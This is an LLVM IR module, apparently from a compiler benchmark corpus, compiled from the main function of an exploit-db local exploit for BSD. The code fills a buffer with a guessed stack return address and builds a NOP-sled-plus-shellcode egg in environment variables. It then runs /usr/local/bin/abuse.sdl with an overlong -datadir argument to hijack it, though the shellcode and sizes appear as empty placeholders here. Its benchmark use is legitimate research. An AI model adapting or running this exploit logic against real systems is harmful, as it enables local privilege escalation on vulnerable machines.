; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_22811.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_22811.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DEFAULT_BUFFER_SIZE = common dso_local global i32 0, align 4
@DEFAULT_EGG_SIZE = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32* null, align 8
@NOP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"RET=\00", align 1
@.str.2 = private unnamed_addr constant [39 x i8] c"/usr/local/bin/abuse.sdl -datadir $RET\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i64*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %10 = load i32, i32* @DEFAULT_BUFFER_SIZE, align 4
  store i32 %10, i32* %7, align 4
  %11 = load i32, i32* @DEFAULT_EGG_SIZE, align 4
  store i32 %11, i32* %9, align 4
  %12 = call i64 (...) @get_esp()
  store i64 %12, i64* %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = call i8* @malloc(i32 %13)
  store i8* %14, i8** %2, align 8
  %15 = load i32, i32* %9, align 4
  %16 = call i8* @malloc(i32 %15)
  store i8* %16, i8** %4, align 8
  %17 = load i8*, i8** %2, align 8
  store i8* %17, i8** %3, align 8
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i64*
  store i64* %19, i64** %5, align 8
  store i32 0, i32* %8, align 4
  br label %20

20:                                               ; preds = %28, %0
  %21 = load i32, i32* %8, align 4
  %22 = load i32, i32* %7, align 4
  %23 = icmp slt i32 %21, %22
  br i1 %23, label %24, label %31

24:                                               ; preds = %20
  %25 = load i64, i64* %6, align 8
  %26 = load i64*, i64** %5, align 8
  %27 = getelementptr inbounds i64, i64* %26, i32 1
  store i64* %27, i64** %5, align 8
  store i64 %25, i64* %26, align 8
  br label %28

28:                                               ; preds = %24
  %29 = load i32, i32* %8, align 4
  %30 = add nsw i32 %29, 4
  store i32 %30, i32* %8, align 4
  br label %20

31:                                               ; preds = %20
  %32 = load i8*, i8** %4, align 8
  store i8* %32, i8** %3, align 8
  store i32 0, i32* %8, align 4
  br label %33

33:                                               ; preds = %46, %31
  %34 = load i32, i32* %8, align 4
  %35 = load i32, i32* %9, align 4
  %36 = load i32*, i32** @shellcode, align 8
  %37 = call i32 @strlen(i32* %36)
  %38 = sub nsw i32 %35, %37
  %39 = sub nsw i32 %38, 1
  %40 = icmp slt i32 %34, %39
  br i1 %40, label %41, label %49

41:                                               ; preds = %33
  %42 = load i32, i32* @NOP, align 4
  %43 = trunc i32 %42 to i8
  %44 = load i8*, i8** %3, align 8
  %45 = getelementptr inbounds i8, i8* %44, i32 1
  store i8* %45, i8** %3, align 8
  store i8 %43, i8* %44, align 1
  br label %46

46:                                               ; preds = %41
  %47 = load i32, i32* %8, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %8, align 4
  br label %33

49:                                               ; preds = %33
  store i32 0, i32* %8, align 4
  br label %50

50:                                               ; preds = %64, %49
  %51 = load i32, i32* %8, align 4
  %52 = load i32*, i32** @shellcode, align 8
  %53 = call i32 @strlen(i32* %52)
  %54 = icmp slt i32 %51, %53
  br i1 %54, label %55, label %67

55:                                               ; preds = %50
  %56 = load i32*, i32** @shellcode, align 8
  %57 = load i32, i32* %8, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i32, i32* %56, i64 %58
  %60 = load i32, i32* %59, align 4
  %61 = trunc i32 %60 to i8
  %62 = load i8*, i8** %3, align 8
  %63 = getelementptr inbounds i8, i8* %62, i32 1
  store i8* %63, i8** %3, align 8
  store i8 %61, i8* %62, align 1
  br label %64

64:                                               ; preds = %55
  %65 = load i32, i32* %8, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* %8, align 4
  br label %50

67:                                               ; preds = %50
  %68 = load i8*, i8** %2, align 8
  %69 = load i32, i32* %7, align 4
  %70 = sub nsw i32 %69, 1
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %68, i64 %71
  store i8 0, i8* %72, align 1
  %73 = load i8*, i8** %4, align 8
  %74 = load i32, i32* %9, align 4
  %75 = sub nsw i32 %74, 1
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %73, i64 %76
  store i8 0, i8* %77, align 1
  %78 = load i8*, i8** %4, align 8
  %79 = call i32 @memcpy(i8* %78, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 4)
  %80 = load i8*, i8** %4, align 8
  %81 = call i32 @putenv(i8* %80)
  %82 = load i8*, i8** %2, align 8
  %83 = call i32 @memcpy(i8* %82, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i32 4)
  %84 = load i8*, i8** %2, align 8
  %85 = call i32 @putenv(i8* %84)
  %86 = call i32 @system(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.2, i64 0, i64 0))
  %87 = load i32, i32* %1, align 4
  ret i32 %87
}

declare dso_local i64 @get_esp(...) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
